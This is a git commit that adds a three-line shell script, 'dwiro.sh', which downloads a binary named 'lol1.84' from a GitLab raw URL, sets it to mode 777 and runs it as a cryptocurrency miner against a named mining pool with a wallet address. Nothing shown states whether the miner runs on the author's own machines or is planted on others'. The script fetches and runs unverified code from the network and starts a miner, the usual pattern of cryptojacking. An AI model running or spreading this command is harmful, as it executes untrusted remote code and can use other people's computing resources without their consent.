ab6f555d540725cfd40faa37cbd0f2c48c7f8734
MJVideo <majapahlevi@gmail.com>
2024-03-06 12:43:56 +0000

    Add new file

---
+++ dwiro.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84 && chmod 777 lol1.84 && ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQAims_2exCTGXcCYD5l2fOb2aGBst1BDFmyy8sNVPr3qjjB --pass x
